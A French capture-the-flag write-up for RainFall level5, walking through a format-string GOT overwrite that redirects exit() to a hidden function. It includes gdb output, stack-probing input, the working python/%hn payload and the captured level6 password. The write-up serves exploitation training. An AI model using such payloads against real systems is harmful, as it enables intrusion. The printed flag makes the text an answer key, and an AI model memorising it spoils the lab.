## 1 - Récupérer les adresses des fonctions

```shell
level5@RainFall:~$ gdb ./level5 
[...]
(gdb) info functions
[...]
0x080484a4  o
[...]
(gdb) disass exit
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:	jmp    *0x8049838
   0x080483d6 <+6>:	push   $0x28
   0x080483db <+11>:	jmp    0x8048370
End of assembler dump.
```

On observe que les deux fonctions partagent les 2 mêmes bytes forts et diffèrent sur leurs bytes faibles

0x0804 | 83d0  exit
0x0804 | 84a4  o

## 2 - Identifier la position de notre input

Le GOT Overwrite est une technique d’exploitation binaire où l’adresse GOT d’une fonction est remplacée par l’adresse d’une fonction de notre choix.

Ici on va donc vouloir exploiter la vulnerabilité du printf avec `%n` pour remplacer les deux derniers bytes (les bytes faibles) de l'adresse de la fonction exit, et que la fonction `o()` s'éxécute à la place

Puisque ces deux adresses partagent les deux octets de poids fort, nous pouvons prendre un raccourci ici. Il nous suffit de modifier uniquement les octets de poids faible pour que `o()` soit exécutée, ce qui rend la chaîne de format plus courte et plus lisible.

Comme précédemment, identifions d’abord quelle position d’argument sur la pile correspond à notre entrée.

```shell
level5@RainFall:~$ ./level5
AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 
```

Cette fois, notre entrée correspond au 4ème argument sur la pile.

## 3 - GOT overwrite

`0x84a4 en décimal = 33956`

Maintenant que nous connaissons la position de la chaîne de format sur la pile, il ne nous reste plus qu'à créer une chaîne de **33956** caractères contenant l'adresse de `exit()`. Cette chaîne permettra de faire correspondre les octets de poids faible de l’adresse avec ceux de la fonction `o()`, et d’écrire ces octets grâce au format `%hn`.

```shell
level5@RainFall:~$ (python -c 'print "\x08\x04\x98\x38"[::-1] + "%33952c%4$hn"'; cat) | ./level5
[...]
cat /home/user/level6/.pass 
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

> On écrit d'abord l'adresse de `exit()`, qui occupe déjà **4** octets. Ensuite, l'utilisation de `%33952c` permet d'ajouter **33952** espaces en guise de remplissage, ce qui aboutit à une chaîne de caractères d'une longueur totale de **33956** octets. Enfin, il suffit d'afficher le nombre de caractères écrits jusqu'à présent grâce à `%hn`, qui écrira sur les deux octets de poids faible du 4ème argument de la pile (grâce à `%4$`), pour réaliser la modification souhaitée.
